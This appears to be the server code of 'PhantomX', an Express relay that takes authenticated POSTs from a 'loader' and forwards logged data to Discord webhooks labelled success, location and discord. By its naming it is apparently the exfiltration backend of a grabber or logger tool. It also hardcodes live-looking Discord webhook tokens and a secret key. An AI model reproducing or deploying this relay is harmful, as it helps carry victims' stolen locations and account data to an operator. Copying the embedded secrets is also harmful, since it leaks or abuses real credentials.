const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const app = express();

app.use(cors());
app.use(express.json());

// استخدم متغيرات البيئة لآمان أفضل
const WEBHOOKS = {
    success: process.env.SUCCESS_WEBHOOK || "https://discord.com/api/webhooks/1449849027205005553/PAEzYHXc3N73MSE4amTvjYzQgzeWyTF_G9j2TbszgjuhhbMfraCj71jxXydDrRpbPEWR",
    location: process.env.LOCATION_WEBHOOK || "https://discord.com/api/webhooks/1469763000465494229/Ot1Gx1li0JyjzEvcOtfH1PpTpKohedRhiV7xjyeKNUa2Xv8cYybygSwKC_dpgalakC1f",
    discord: process.env.DISCORD_WEBHOOK || "https://discord.com/api/webhooks/1449124545620611255/OnOeMG0VM3A4XeS3aBDRs5xxETz_rXnc-i2R__zKwyA06VLuNE6nFdJaP38Po1Q80rkB"
};

const SECRET_KEY = process.env.SECRET_KEY || "93847165029471658392016485730291";

// روت الصحة للتأكد من تشغيل السيرفر
app.get("/", (req, res) => {
    res.send("✅ PhantomX Webhook Relay API is running");
});

// روت الاستقبال من اللودر
app.post("/log", async (req, res) => {
    try {
        console.log("📥 Received request:", JSON.stringify(req.body, null, 2));
        
        // التحقق من المفتاح
        const key = req.headers["x-key"];
        if (key !== SECRET_KEY) {
            console.log("❌ Invalid key:", key);
            return res.status(401).json({error: "Invalid key"});
        }

        // التحقق من البيانات
        const { type, embed } = req.body;
        if (!type || !embed) {
            console.log("❌ Missing type or embed");
            return res.status(400).json({error: "Missing type or embed"});
        }

        if (!WEBHOOKS[type]) {
            console.log("❌ Invalid webhook type:", type);
            return res.status(400).json({error: "Invalid webhook type"});
        }

        console.log(`📤 Forwarding to ${type} webhook: ${WEBHOOKS[type]}`);
        
        // إرسال للويب هوك المناسب
        const response = await fetch(WEBHOOKS[type], {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "PhantomX-Relay/2.0"
            },
            body: JSON.stringify({ 
                embeds: [embed],
                username: "PhantomX Logger",
                avatar_url: "https://cdn.discordapp.com/attachments/1153844022028087316/1251378827826102393/phantomx_logo.png"
            })
        });

        const result = await response.text();
        console.log(`✅ Sent to Discord (${type}), Status: ${response.status}`);
        
        res.json({ 
            success: true, 
            discordStatus: response.status,
            message: `Webhook sent to ${type}` 
        });
        
    } catch (err) {
        console.error("🔥 Server error:", err);
        res.status(500).json({ 
            error: "Server error", 
            details: err.message 
        });
    }
});

// روت لاختبار الويب هوكات
app.get("/test-webhooks", async (req, res) => {
    try {
        const results = {};
        
        for (const [type, url] of Object.entries(WEBHOOKS)) {
            try {
                const testEmbed = {
                    title: `✅ Test Webhook - ${type}`,
                    description: "This is a test message from PhantomX Relay API",
                    color: 65280,
                    timestamp: new Date().toISOString(),
                    footer: { text: "Test • " + new Date().toLocaleString() }
                };
                
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [testEmbed] })
                });
                
                results[type] = {
                    status: response.status,
                    ok: response.ok,
                    url: url
                };
            } catch (err) {
                results[type] = { error: err.message };
            }
        }
        
        res.json(results);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🔑 Using key: ${SECRET_KEY.substring(0, 10)}...`);
    console.log(`🌐 Webhooks configured:`, Object.keys(WEBHOOKS));
});
